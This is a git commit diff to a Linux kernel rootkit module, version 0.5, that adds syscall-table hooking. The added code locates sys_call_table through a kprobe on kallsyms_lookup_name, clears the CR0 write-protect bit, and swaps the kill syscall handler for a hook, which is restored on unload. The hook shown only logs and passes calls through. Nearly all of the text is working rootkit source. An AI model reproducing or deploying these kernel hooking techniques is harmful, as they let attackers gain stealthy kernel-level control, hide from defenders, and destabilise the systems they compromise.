de861bbf79963147be533170d0b8e4852da46aec
Benjamin Haag <b3ny4@protonmail.com>
2022-12-09 22:22:46 +0100

    syscall hooking

--- rootkit.c
+++ rootkit.c
@@ -1,17 +1,102 @@
 #include <linux/module.h>
 #include <net/sock.h>
+#include <linux/kprobes.h>
 
 #define LICENCE "GPL"
 #define DESCRIPTION "Rootkit that can hide arbitrary ressources by using the configure command line tool."
 #define AUTHOR "Benjamin Haag"
-#define VERSION "0.3"
+#define VERSION "0.5"
 
 #define NETLINK_PROTOCOL 31
+
+#define NUM_SYSCALLS 333
 
 MODULE_LICENSE(LICENCE);
 MODULE_DESCRIPTION(DESCRIPTION);
 MODULE_AUTHOR(AUTHOR);
 MODULE_VERSION(VERSION);
+
+
+
+
+
+/***********************************************************
+*          HOOK SYSTEM CALLS                               *
+***********************************************************/
+
+static struct pt_regs ** sys_call_table;
+int (*original[NUM_SYSCALLS])(const struct pt_regs * regs);
+
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name"
+};
+
+typedef unsigned long (*kallsyms_lookup_name_t)(const char * name);
+kallsyms_lookup_name_t kallsyms_lookup_name_alt;
+
+static int find_sys_call_table(void) {
+    register_kprobe(&kp);
+    kallsyms_lookup_name_alt = (kallsyms_lookup_name_t) kp.addr;
+    unregister_kprobe(&kp);
+
+    sys_call_table = (struct pt_regs **)kallsyms_lookup_name_alt("sys_call_table");
+
+    if (sys_call_table == NULL)
+        return -1;
+
+    return 0;
+}
+
+unsigned long int cr0;
+unsigned long int cr0_new;
+
+static int set_wp(int bit) {
+    cr0 = read_cr0();
+    cr0 &=~(1<<16);
+    cr0 |= bit << 16;
+    __asm__ __volatile__ ("mov %0, %%cr0":"+r"(cr0));
+    
+    cr0_new = read_cr0();
+    if(cr0 != cr0_new)
+        return -1;
+    return 0;
+}
+
+static int hook(unsigned int syscall_number, int (*callback)(const struct pt_regs *)) {
+    if (set_wp(0) == -1) {
+        return -1;
+    }
+    original[syscall_number] = (int (*)(const struct pt_regs *))sys_call_table[syscall_number];
+    sys_call_table[syscall_number] = (struct pt_regs *)callback;
+    if (set_wp(1) == -1) {
+        return -1;
+    }
+    return 0;
+}
+
+static int unhook(unsigned int syscall_number) {
+    if (set_wp(0) == -1) {
+        return -1;
+    }
+    sys_call_table[syscall_number] = (struct pt_regs *)original[syscall_number];
+    if (set_wp(1) == -1) {
+        return -1;
+    }
+    return 0;
+}
+
+
+
+
+
+/***********************************************************
+*          NEW SYSTEM CALLS                                *
+***********************************************************/
+
+int my_kill(const struct pt_regs * regs) {
+    printk(KERN_INFO "Rootkit: kill hooked! Now invoking original kill system call handler...\n");
+    return original[__NR_kill](regs);
+}
 
 
 
@@ -131,11 +216,28 @@ module_load(void) {
         return -1;
     }
 
+    if(find_sys_call_table() == -1) {
+        printk(KERN_ERR "Rootkit: could not find sys_call_table :(\n");
+        return -1;
+    }
+
+    // Rootkit should not return past this point. Once a syscall
+    // is hooked and the module unexpectedly unloads, the system
+    // will crash.
+
+    if(hook(__NR_kill, my_kill) != 0) {
+        printk(KERN_ERR "Rootkit:");
+    }
+
     return 0;
 }
 
 static void __exit
 module_unload(void) {
+
+    if(unhook(__NR_kill) != 0) {
+        printk(KERN_ERR "Rootkit:");
+    }
 
     close_socket();
 
